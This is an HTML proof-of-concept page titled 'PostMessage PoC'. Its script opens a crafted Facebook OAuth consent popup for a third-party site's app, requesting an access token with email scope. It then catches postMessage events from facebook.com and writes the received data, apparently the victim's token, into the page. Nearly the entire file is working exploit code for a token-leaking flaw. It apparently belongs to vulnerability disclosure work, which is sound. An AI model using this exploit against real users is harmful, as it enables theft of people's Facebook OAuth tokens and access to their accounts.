<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PostMessage PoC</title>
</head>
<body>
    <button id="openTab">Click to open Facebook</button>

    <script>
        document.getElementById("openTab").addEventListener("click", function() {
            // Open a new tab to www.facebook.com
            let newTab = window.open("https://www.facebook.com/privacy/consent/gdp/?params%5Bapp_id%5D=480788598651526&params%5Bdisplay%5D=%22popup%22&params%5Bdomain%5D=%22www.mrjet.se%22&params%5Bfallback_redirect_uri%5D=%22https%3A%5C%2F%5C%2Fwww.mrjet.se%5C%2Fuser%5C%2Fsignin%3Fckoflag%3D0%26uurl%3De3id%5Cu00253Dredr%5Cu002526rurl%5Cu00253D%5Cu00252F%5Cu00253Flogout%5Cu00253D1%22&params%5Bkid_directed_site%5D=false&params%5Blogger_id%5D=%22ff766b2d228b39e1b%22&params%5Bnext%5D=%22confirm%22&params%5Bredirect_uri%5D=%22https%3A%5C%2F%5C%2Fstaticxx.facebook.com%5C%2Fx%5C%2Fconnect%5C%2Fxd_arbiter%5C%2F%3Fversion%3D46%23cb%3Dfb09c291e4f1fc3c6%26domain%3Dwww.mrjet.se%26is_canvas%3Dfalse%26origin%3Dhttps%5Cu00253A%5Cu00252F%5Cu00252Fwww.mrjet.se%5Cu00252Ff6f0424506e199e79%26relation%3Dopener%26frame%3Df9a53533b9e6aebac%22&params%5Bresponse_type%5D=%22token%2Csigned_request%2Cgraph_domain%22&params%5Breturn_scopes%5D=false&params%5Bscope%5D=%5B%22email%22%5D&params%5Bsdk%5D=%22joey%22&params%5Bsteps%5D=%7B%7D&params%5Btp%5D=%22unspecified%22&params%5Bcui_gk%5D=%22%5BPASS%5D%3Alogin_platformization_joey%22&params%5Bis_limited_login_shim%5D=false&source=gdp_delegated", "_blank");

            // Set up the message listener
            window.addEventListener("message", function(event) {
                // Check the origin of the message to ensure it's from www.facebook.com
                if (event.origin === "https://www.facebook.com") {
                    // Write the received message to the document
                    document.write("Message from Facebook: " + event.data);
                } else {
                    console.warn("Received message from unauthorized origin:", event.origin);
                }
            }, false);
        });
    </script>
</body>
</html>
